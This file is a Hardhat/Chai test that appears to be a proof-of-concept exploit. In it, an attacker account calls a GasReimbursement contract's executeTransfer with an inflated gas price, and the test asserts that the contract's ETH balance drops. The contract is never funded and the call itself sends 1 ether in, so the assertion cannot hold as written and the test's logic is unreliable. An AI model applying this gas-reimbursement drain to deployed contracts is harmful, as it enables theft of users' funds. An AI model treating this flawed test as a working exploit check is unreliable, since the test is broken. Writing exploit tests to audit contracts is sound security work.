const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GasReimbursement Contract", function () {
  let gasReimbursementContract, owner, attacker;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    // Deploy GasReimbursement contract
    const GasReimbursement = await ethers.getContractFactory("GasReimbursement");
    gasReimbursementContract = await GasReimbursement.deploy();
    await gasReimbursementContract.deployed();
  });

  it("Should successfully exploit the GasReimbursement contract", async function () {
    // Get initial balance of GasReimbursement contract
    const initialBalance = await ethers.provider.getBalance(gasReimbursementContract.address);

    // Set a high gas price for the transaction
    const highGasPrice = ethers.utils.parseUnits("100", "gwei");
    const txOverrides = {
      gasPrice: highGasPrice,
      value: ethers.utils.parseEther("1")
    };

    // Simulate the attack by sending a transaction with a high gas price from the attacker
    await gasReimbursementContract.connect(attacker).executeTransfer(attacker.address, txOverrides);

    // Verify that the balance of the GasReimbursement contract has decreased
    const finalBalance = await ethers.provider.getBalance(gasReimbursementContract.address);
    expect(finalBalance).to.be.lessThan(initialBalance);
  });
});